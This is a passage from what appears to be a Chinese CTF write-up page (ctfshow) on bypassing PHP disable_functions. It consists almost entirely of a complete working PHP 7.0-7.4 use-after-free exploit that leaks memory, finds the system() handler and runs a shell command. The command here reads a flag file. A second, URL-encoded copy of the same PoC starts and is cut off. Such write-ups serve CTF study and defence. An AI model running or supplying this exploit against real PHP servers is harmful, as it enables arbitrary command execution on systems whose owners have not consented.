class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ctfshow</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>{</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>{</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>{ </span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$backtrace</span>; </span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">            <span class="variable">$backtrace</span> = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;<span class="title function_ invoke__">getTrace</span>();</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&apos;args&apos;</span>])) {</span><br><span class="line">                <span class="variable">$backtrace</span> = <span class="title function_ invoke__">debug_backtrace</span>();</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>{</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>{</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) {</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>{</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) {</span><br><span class="line">            <span class="variable">$out</span> .= <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>{</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) {</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$v</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>{</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) { <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; }</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>{</span><br><span class="line">        <span class="variable">$e_type</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) {</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) { </span><br><span class="line"></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            } <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) { </span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>{</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) {</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) {</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            } <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) {</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            } <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>{</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) {</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) {</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>{</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> {</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) {</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            }</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        } <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params"><span class="variable">$arg</span></span>) </span>{</span><br><span class="line"></span><br><span class="line">        <span class="variable">$arg</span> = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&apos;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&apos;</span>);</span><br><span class="line">        <span class="variable">$vuln</span> = <span class="keyword">new</span> <span class="title class_">Vuln</span>();</span><br><span class="line">        <span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(PHP_OS, <span class="string">&apos;WIN&apos;</span>)) {</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&apos;This PoC is for *nix systems only.&apos;</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; </span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&apos;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&apos;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">trigger_uaf</span>(<span class="string">&apos;x&apos;</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&apos;args&apos;</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> Helper;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>{ };</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">79</span> || <span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">0</span>) {</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_handlers</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_obj</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$binary_leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = <span class="title function_ invoke__">get_binary_base</span>(<span class="variable">$binary_leak</span>))) {</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&apos;t determine binary base address&quot;</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = <span class="title function_ invoke__">parse_elf</span>(<span class="variable">$base</span>))) {</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&apos;t parse ELF header&quot;</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = <span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$base</span>, <span class="variable">$elf</span>))) {</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&apos;t get basic_functions address&quot;</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = <span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>))) {</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&apos;t get zif_system address&quot;</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) {</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); </span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); </span><br><span class="line"></span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ctfshow</span>(<span class="string">&quot;cat /flag0.txt&quot;</span>);<span class="title function_ invoke__">ob_end_flush</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>


        <h4 id="uaf&#x811A;&#x672C;">
          <a href="#uaf&#x811A;&#x672C;" class="heading-link"><i class="fas fa-link"></i></a><a href="#uaf&#x811A;&#x672C;" class="headerlink" title="uaf&#x811A;&#x672C;"></a>uaf&#x811A;&#x672C;</h4>
      <p><strong>&#x6709;&#x4E24;&#x4E2A;&#x7248;&#x672C;&#xFF0C;&#x539F;&#x59CB;&#x7248;&#x672C;&#x7684;&#x4E00;&#x4E9B;&#x51FD;&#x6570;&#x88AB;&#x7981;&#x4E86;&#xFF0C;&#x540E;&#x6765;feng&#x5E08;&#x5085;&#x7248;&#x672C;&#x6539;&#x4E86;&#x4E4B;&#x540E;&#x80FD;&#x51FA;flag</strong></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br></pre></td><td class="code"><pre><span class="line">c=</span><br><span class="line"></span><br><span class="line">#+PHP+7.0-7.4+disable_functions+bypass+PoC+(*nix+only)</span><br><span class="line">#</span><br><span class="line">#+Bug:+https://bugs.php.net/bug.php?id=76047</span><br><span class="line">#+debug_backtrace()+returns+a+reference+to+a+variable+</span><br><span class="line">#+that+has+been+destroyed,+causing+a+UAF+vulnerability.</span><br><span class="line">#</span><br><span class="line">#+This+exploit+should+work+on+all+PHP+7.0-7.4+versions</span><br><span class="line">#+released+as+of+30/01/2020.</span><br><span class="line">#</span><br><span class="line">#+Author:+https://github.com/mm0r1</span><br><span class="line"></span><br><span class="line">pwn(&quot;cat+/flag0.txt&quot;);</span><br><span class="line"></span><br><span class="line">function+pwn($cmd)+{</span><br><span class="line">++++global+$abc,+$helper,+$backtrace;</span><br><span class="line"></span><br><span class="line">++++class+Vuln+{</span><br><span class="line">++++++++public+$a;</span><br><span class="line">++++++++public+function+__destruct()+{+</span><br><span 